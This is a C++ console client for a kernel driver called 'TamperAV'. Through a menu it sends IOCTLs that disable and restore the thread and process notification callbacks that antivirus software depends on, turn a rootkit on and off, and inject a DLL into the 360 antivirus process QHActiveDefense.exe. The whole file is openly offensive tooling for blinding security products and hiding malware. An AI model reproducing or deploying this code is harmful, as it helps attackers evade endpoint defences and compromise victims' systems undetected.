#include "DllInject.h"
#include <winioctl.h>

#define THREAD_REGISTER_CALLBACK_OFF CTL_CODE(FILE_DEVICE_UNKNOWN,    0x800,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define THREAD_REGISTER_CALLBACK_ON CTL_CODE(FILE_DEVICE_UNKNOWN,    0x801,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ROOTKIT_ON CTL_CODE(FILE_DEVICE_UNKNOWN,    0x802,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ROOTKIT_OFF CTL_CODE(FILE_DEVICE_UNKNOWN,    0x803,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define PROCESS_REGISTER_CALLBACK_OFF CTL_CODE(FILE_DEVICE_UNKNOWN,    0x804,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define PROCESS_REGISTER_CALLBACK_ON CTL_CODE(FILE_DEVICE_UNKNOWN,    0x805,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define SymLinkName L"\\\\.\\TamperAV"

VOID menu() {
				std::cout << "[1] Patch Thread Register Callback" << std::endl
								<< "[2] Restore Thread Register Callback" << std::endl
								<< "[3] Patch Process Register Callback" << std::endl
								<< "[4] Restore Process Register Callback" << std::endl
								<< "[5] DLL Injection into 360 Process - QHActiveDefense.exe" << std::endl
								<< "[6] Turn On RootKit" << std::endl
								<< "[7] Turn Off RootKit" << std::endl;
}

int main(int argc, char* argv[])
{
				HANDLE hDevice =
								CreateFile(SymLinkName,
												GENERIC_READ | GENERIC_WRITE,
												0,
												NULL,
												OPEN_EXISTING,
												FILE_ATTRIBUTE_SYSTEM,
												0);
				if (hDevice == INVALID_HANDLE_VALUE)
				{
								printf("Get Driver Handle Error with Win32 error code: %d\n", GetLastError());
								return 0;
				}

				char data[8] = { 0 };
				int choice;
				DWORD dwWrite = 0;
				while (true) {
								menu();
								std::cin >> choice;
								if (choice == 1) {
												DeviceIoControl(hDevice, THREAD_REGISTER_CALLBACK_OFF,
																data,
																sizeof(data),
																data,
																sizeof(data),
																&dwWrite, NULL);
								}
								else if (choice == 2) {
												DeviceIoControl(hDevice, THREAD_REGISTER_CALLBACK_ON,
																data,
																sizeof(data),
																data,
																sizeof(data),
																&dwWrite, NULL);
								}
								else if (choice == 3) {
												DeviceIoControl(hDevice, PROCESS_REGISTER_CALLBACK_OFF,
																data,
																sizeof(data),
																data,
																sizeof(data),
																&dwWrite, NULL);
								}
								else if (choice == 4) {
												DeviceIoControl(hDevice, PROCESS_REGISTER_CALLBACK_ON,
																data,
																sizeof(data),
																data,
																sizeof(data),
																&dwWrite, NULL);
								}
								else if (choice == 5) {
												dllInject();
								}
								else if (choice == 6) {
												DeviceIoControl(hDevice, ROOTKIT_ON,
																data,
																sizeof(data),
																data,
																sizeof(data),
																&dwWrite, NULL);
								}
								else if (choice == 7) {
												DeviceIoControl(hDevice, ROOTKIT_OFF,
																data,
																sizeof(data),
																data,
																sizeof(data),
																&dwWrite, NULL);
								}
								else {
												std::cout << "Invalid Chocie\n";
												break;
								}
				}
				CloseHandle(hDevice);
				return 0;
}